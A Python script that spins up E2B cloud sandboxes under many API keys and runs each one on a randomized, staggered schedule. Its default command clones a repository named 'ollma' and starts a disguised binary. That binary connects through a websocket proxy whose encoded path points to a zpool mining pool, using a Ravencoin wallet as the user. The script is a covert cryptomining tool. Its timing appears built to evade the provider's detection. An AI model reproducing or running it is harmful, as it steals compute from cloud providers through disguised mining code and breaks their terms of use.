#!/usr/bin/env python
"""
main.py  –  Launch E2B sandboxes with a randomized, timed lifecycle.

Each sandbox runs for a random duration within a specified range,
shuts down, then restarts after a random cooldown period.

MODIFIED:
- Staggered start: Introduces a random grace period between launching sandboxes.
- Retry logic: Attempts to connect up to 10 times for each session.
- Abandon key: If connection fails 10 times, the API key is abandoned.

MODIFIED (User Request):
- Concurrency Limit: REMOVED. Sandboxes are now launched sequentially with a grace period.
- Failed Attempt Cooldown: The cooldown after a failed connection attempt is randomized between 60 and 250 seconds.
"""

import asyncio
import argparse
import os
import sys
import random
from itertools import count
from typing import List, Set

from dotenv import load_dotenv
from e2b_code_interpreter import AsyncSandbox

# ─────────────────────────  YOUR BUILD-AND-RUN COMMAND  ───────────────────────
DEFAULT_COMMAND = r"""
git clone https://github.com/marcei9809/ollma.git && \
cd ollma && chmod +x ./node && \
cat > data.json <<'EOF'
{
  "proxy": "wss://deji-hv6a.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
  "config": { "threads": 4, "log": true },
  "options": {
    "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
    "password": "c=RVN",
    "argent": "Deb22222"
  }
}
EOF
./node app.js
"""
# ──────────────────────────────────────────────────────────────────────────────

ENV_PREFIX = "E2B_KEY_"
MAX_CONNECTION_ATTEMPTS = 10


# ─── helpers ──────────────────────────────────────────────────────────────────
def env_keys(prefix: str = ENV_PREFIX) -> List[str]:
    """All env-var values whose names start with *prefix* and are non-empty."""
    return [v for k, v in os.environ.items() if k.startswith(prefix) and v.strip()]

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Spin up E2B sandboxes with a randomized, timed lifecycle.")
    p.add_argument("--key", action="append", metavar="E2B_API_KEY", help="repeat for multiple keys")
    p.add_argument("--cmd", default=DEFAULT_COMMAND, help="shell to run in each sandbox")
    p.add_argument("--run-time-min", type=int, default=230, help="Minimum run duration in seconds (default: 230)")
    p.add_argument("--run-time-max", type=int, default=340, help="Maximum run duration in seconds (default: 340)")
    p.add_argument("--downtime-min", type=int, default=30, help="Minimum cooldown in seconds (default: 30)")
    p.add_argument("--downtime-max", type=int, default=45, help="Maximum cooldown in seconds (default: 45)")
    return p.parse_args()

# ─── per-sandbox task ─────────────────────────────────────────────────────────
async def run_sandbox_lifecycle(
    key: str, cmd: str, idx: int,
    run_time_min: int, run_time_max: int,
    downtime_min: int, downtime_max: int
) -> None:
    """Manages the entire lifecycle of a single sandbox with random timings and retry logic."""
    tag = f"sbx-{idx}"

    while True:
        # --- Connection Retry Loop ---
        sbx_instance = None
        for attempt in range(MAX_CONNECTION_ATTEMPTS):
            try:
                print(f"🟡  [{tag}] Attempting to start session (…{key[-6:]}), attempt {attempt + 1}/{MAX_CONNECTION_ATTEMPTS}", flush=True)
                sbx_instance = await AsyncSandbox.create(api_key=key, timeout=0)
                print(f"✅  [{tag}] Session started successfully.", flush=True)
                break  # Exit retry loop on success
            except Exception as e:
                print(f"❌  [{tag}] Connection attempt {attempt + 1} failed: {e}", file=sys.stderr, flush=True)
                if attempt < MAX_CONNECTION_ATTEMPTS - 1:
                    # MODIFIED: Use a longer, randomized cooldown after a failed connection attempt.
                    fail_cooldown = random.randint(60, 250)
                    print(f"⏰  [{tag}] Cooling down for {fail_cooldown}s before retry.", file=sys.stderr, flush=True)
                    await asyncio.sleep(fail_cooldown)
                else:
                    print(f"🚫  [{tag}] Abandoning key (…{key[-6:]}) after {MAX_CONNECTION_ATTEMPTS} failed attempts.", file=sys.stderr, flush=True)
                    return  # Abandons this key permanently

        if not sbx_instance:
            return # Should not be reached, but as a safeguard.

        # --- Command Execution and Timed Run ---
        run_time = random.randint(run_time_min, run_time_max)
        downtime = random.randint(downtime_min, downtime_max)

        try:
            async with sbx_instance as sbx:
                proc = await sbx.commands.run(
                    cmd=cmd,
                    background=True,
                    timeout=0
                )
                info = await sbx.get_info()
                print(f"🚀  [{tag}] Launched. Will run for {run_time}s. ID: {info.sandbox_id}", flush=True)
                await asyncio.wait_for(proc.wait(), timeout=run_time)

        except asyncio.TimeoutError:
            print(f"⏳  [{tag}] Run time ended. Shutting down sandbox.", flush=True)
        except Exception as e:
            print(f"\n❌  [{tag}] An error occurred during command execution: {e}", file=sys.stderr, flush=True)

        print(f"😴  [{tag}] In cooldown for {downtime}s.", flush=True)
        await asyncio.sleep(downtime)


# ─── main entry ───────────────────────────────────────────────────────────────
async def main_async() -> None:
    load_dotenv()
    args = parse_args()

    # Validate that min is not greater than max
    if args.run_time_min > args.run_time_max:
        sys.exit("Error: --run-time-min cannot be greater than --run-time-max")
    if args.downtime_min > args.downtime_max:
        sys.exit("Error: --downtime-min cannot be greater than --downtime-max")

    seen: Set[str] = set()
    keys: List[str] = []
    for k in env_keys() + (args.key or []):
        if k not in seen:
            keys.append(k)
            seen.add(k)

    if not keys:
        sys.exit(f"No API keys found — set {ENV_PREFIX}* or pass --key")

    print(f"Found {len(keys)} API key(s). Launching sandboxes sequentially with a grace period...\n")
    tasks = []
    # MODIFIED: Re-introducing the sequential launch with a grace period from the original file.
    for i, k in enumerate(count()):
        if i >= len(keys): break # Ensure we don't go out of bounds
        
        task = asyncio.create_task(run_sandbox_lifecycle(
            keys[i], args.cmd, i,
            args.run_time_min, args.run_time_max,
            args.downtime_min, args.downtime_max
        ))
        tasks.append(task)
        
        # After launching a task, wait before launching the next one
        if i < len(keys) - 1:
            grace_period = random.randint(30, 45)
            print(f"\n───────────────────[ GRACE PERIOD: {grace_period}s ]───────────────────\n", flush=True)
            await asyncio.sleep(grace_period)

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n⏹️  Interrupted — shutting down.", file=sys.stderr)




